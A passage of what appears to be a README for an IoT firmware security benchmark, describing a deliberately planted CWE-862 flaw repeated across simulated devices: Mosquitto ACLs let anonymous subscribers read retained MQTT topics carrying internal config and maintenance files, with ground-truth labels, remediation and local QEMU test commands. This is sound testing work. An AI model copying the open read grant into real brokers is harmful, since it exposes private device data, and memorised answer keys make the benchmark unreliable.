  --image /export/doorlock-cwe862-mqtt-internal-files/qemuarm64/iotbench-doorlock-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — envsensor

Simulated device: **environmental sensor**, retaining existing MQTT peripheral telemetry.
Device profile: `meta-iotbench/recipes-devices/envsensor/`.
Firmware directory: `deploy-images/envsensor-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-envsensor-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/envsensor-cwe862-mqtt-internal-files/qemuarm64/iotbench-envsensor-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=envsensor`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=envsensor-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=envsensor-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device envsensor
~~~

Expected: exact internal bytes, `device_class=envsensor` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot envsensor` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/envsensor-cwe862-mqtt-internal-files/qemuarm64/iotbench-envsensor-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — healthmonitor

Simulated device: **health monitor**, retaining existing MQTT peripheral telemetry.
Device profile: `meta-iotbench/recipes-devices/healthmonitor/`.
Firmware directory: `deploy-images/healthmonitor-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-healthmonitor-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/healthmonitor-cwe862-mqtt-internal-files/qemuarm64/iotbench-healthmonitor-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=healthmonitor`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=healthmonitor-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=healthmonitor-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device healthmonitor
~~~

Expected: exact internal bytes, `device_class=healthmonitor` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot healthmonitor` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/healthmonitor-cwe862-mqtt-internal-files/qemuarm64/iotbench-healthmonitor-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — ipcamera

Simulated device: **surveillance IP camera**, retaining existing HTTP snapshot/MJPEG stream and web admin.
Device profile: `meta-iotbench/recipes-devices/ipcamera/`.
Firmware directory: `deploy-images/ipcamera-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-ipcamera-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/ipcamera-cwe862-mqtt-internal-files/qemuarm64/iotbench-ipcamera-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=ipcamera`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=ipcamera-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=ipcamera-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device ipcamera
~~~

Expected: exact internal bytes, `device_class=ipcamera` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot ipcamera` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/ipcamera-cwe862-mqtt-internal-files/qemuarm64/iotbench-ipcamera-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — plc

Simulated device: **industrial PLC gateway**, retaining existing Modbus/TCP registers and web admin.
Device profile: `meta-iotbench/recipes-devices/plc/`.
Firmware directory: `deploy-images/plc-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-plc-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/plc-cwe862-mqtt-internal-files/qemuarm64/iotbench-plc-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=plc`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=plc-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=plc-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device plc
~~~

Expected: exact internal bytes, `device_class=plc` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot plc` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/plc-cwe862-mqtt-internal-files/qemuarm64/iotbench-plc-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — router

Simulated device: **network router/gateway**, retaining existing HTTP web admin.
Device profile: `meta-iotbench/recipes-devices/router/`.
Firmware directory: `deploy-images/router-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-router-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/router-cwe862-mqtt-internal-files/qemuarm64/iotbench-router-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=router`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=router-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=router-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device router
~~~

Expected: exact internal bytes, `device_class=router` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot router` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/router-cwe862-mqtt-internal-files/qemuarm64/iotbench-router-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — smartbulb

Simulated device: **lighting smart bulb**, retaining existing MQTT peripheral telemetry.
Device profile: `meta-iotbench/recipes-devices/smartbulb/`.
Firmware directory: `deploy-images/smartbulb-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-smartbulb-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/smartbulb-cwe862-mqtt-internal-files/qemuarm64/iotbench-smartbulb-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=smartbulb`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=smartbulb-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=smartbulb-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device smartbulb
~~~

Expected: exact internal bytes, `device_class=smartbulb` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot smartbulb` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/smartbulb-cwe862-mqtt-internal-files/qemuarm64/iotbench-smartbulb-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — smarthub

Simulated device: **controller/smart hub**, retaining existing MQTT peripheral telemetry.
Device profile: `meta-iotbench/recipes-devices/smarthub/`.
Firmware directory: `deploy-images/smarthub-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-smarthub-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/smarthub-cwe862-mqtt-internal-files/qemuarm64/iotbench-smarthub-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=smarthub`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=smarthub-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=smarthub-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device smarthub
~~~

Expected: exact internal bytes, `device_class=smarthub` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot smarthub` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/smarthub-cwe862-mqtt-internal-files/qemuarm64/iotbench-smarthub-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — smartplug

Simulated device: **energy-management smart plug**, retaining existing MQTT peripheral telemetry.
Device profile: `meta-iotbench/recipes-devices/smartplug/`.
Firmware directory: `deploy-images/smartplug-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-smartplug-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/smartplug-cwe862-mqtt-internal-files/qemuarm64/iotbench-smartplug-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=smartplug`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=smartplug-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=smartplug-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device smartplug
~~~

Expected: exact internal bytes, `device_class=smartplug` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot smartplug` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/smartplug-cwe862-mqtt-internal-files/qemuarm64/iotbench-smartplug-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — smartspeaker

Simulated device: **audio smart speaker**, retaining existing MQTT peripheral telemetry.
Device profile: `meta-iotbench/recipes-devices/smartspeaker/`.
Firmware directory: `deploy-images/smartspeaker-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-smartspeaker-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/smartspeaker-cwe862-mqtt-internal-files/qemuarm64/iotbench-smartspeaker-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
`meta-iotbench/recipes-vulns/cwe862-mqtt-internal-files/`, with the local
Mosquitto broker and `/usr/bin/iotbench-mqtt-internal-files` publisher.
Active config `/etc/mosquitto/iotbench.conf` loads the public read ACL
`/etc/mosquitto/iotbench-public.acl` on guest TCP 1883 and local write ACL
`/etc/mosquitto/iotbench-publish.acl` on guest-loopback TCP 1884.
Startup uses `iotbench-mqtt-internal-files.service` and the
`mosquitto.service.d/10-iotbench-listener.conf` drop-in under
`/usr/lib/systemd/system/`. The publisher runs as locked `mqttfixture` UID/GID
991; the existing telemetry drop-in is described in the shared configuration.
Source annotation, ground truth and NOTICE are under
`/usr/share/iotbench/mqtt-internal-files/`.

Static mapping: `device/config` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/device.conf`, containing
`device_class=smartspeaker`, a fake asset reference, calibration profile and diagnostic
mode. `maintenance/info` exposes
`/usr/share/iotbench/mqtt-internal-files/internal/maintenance.dat`, containing
a synthetic maintenance reference, service window and self-test state.
Both files are internal-maintenance-only, root:mqttfixture `0640` inside `0750`.
They should require maintenance authorization; they are not public telemetry.

Vulnerable flow: **internal synthetic file → `read_internal()` / `openat` /
`read` → `publish_files()` / `mosquitto_publish()` → corresponding retained
MQTT topic → anonymous subscriber allowed by public ACL**.
The intentionally insufficient check is the unconditional anonymous read grant
for both private topics, with no maintenance identity/role restriction.
Expected static finding: correlate those fixed firmware files, read-to-publish
flow and active anonymous ACL. Ground-truth label: **MQTT Server Communicating
with Vulnerable Internal Files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove the two public read grants or authorize authenticated
maintenance subscribers for each topic, preserving fixed read-only mapping.

Local build and boot (host repository root):

~~~bash
FIRMWARE=smartspeaker-cwe862-mqtt-internal-files docker compose run --rm yocto
FIRMWARE=smartspeaker-cwe862-mqtt-internal-files ./scripts/run-qemu.sh
~~~

Local test (second host terminal, no credential):

~~~bash
python3 scripts/test-mqtt-internal-files.py --get device/config
python3 scripts/test-mqtt-internal-files.py --get maintenance/info
python3 scripts/test-mqtt-internal-files.py --device smartspeaker
~~~

Expected: exact internal bytes, `device_class=smartspeaker` and
`MQTT_INTERNAL_CONFIG_EXPOSED` on `device/config`, plus
`MQTT_INTERNAL_MAINTENANCE_EXPOSED` on `maintenance/info`. Use
`python3 scripts/test-mqtt-internal-files.py --boot smartspeaker` separately from manual
QEMU for file-origin, rejection and restart checks in a disposable snapshot.
To inspect this firmware offline:

~~~bash
docker compose run --rm yocto python3 /scripts/test-mqtt-internal-files.py \
  --image /export/smartspeaker-cwe862-mqtt-internal-files/qemuarm64/iotbench-smartspeaker-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst
~~~

### MQTT Internal Files — thermostat

Simulated device: **climate-control thermostat**, retaining existing MQTT peripheral telemetry.
Device profile: `meta-iotbench/recipes-devices/thermostat/`.
Firmware directory: `deploy-images/thermostat-cwe862-mqtt-internal-files/<machine>/`.
Image recipe: `meta-iotbench/recipes-images/iotbench-thermostat-cwe862-mqtt-internal-files.bb`.
Default rootfs: `deploy-images/thermostat-cwe862-mqtt-internal-files/qemuarm64/iotbench-thermostat-cwe862-mqtt-internal-files-qemuarm64.rootfs.ext4.zst`;
`Image` is exported alongside it.

Relevant implementation: shared package
